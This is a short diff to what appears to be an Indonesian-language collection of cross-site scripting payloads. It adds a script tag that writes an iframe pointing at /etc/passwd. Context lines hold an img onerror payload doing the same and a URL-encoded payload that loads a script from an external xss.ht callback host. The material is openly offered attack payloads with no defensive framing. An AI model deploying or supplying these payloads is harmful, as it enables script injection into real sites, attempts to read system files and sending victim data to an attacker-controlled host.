@@ -5,6 +5,8 @@ TOLONG DOAKAN PENULIS DAN PEMILIK PAYLOAD YANG PENULIS DAPATKAN DARI SUMBER MANA
 SEMOGA BERKAH DAN MEMBAWA MANFAAT SELALU
 -----------------------------------------------------------------------
 
+<script>document.write('<iframe src=file:///etc/passwd></iframe>');</scrip>
+
 <img src="testing" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
 
 %22%3E%3Cscript+src%3Dhttps%3A%2F%2Fzhirosec.xss.ht%3E%3C%2Fscript%3E
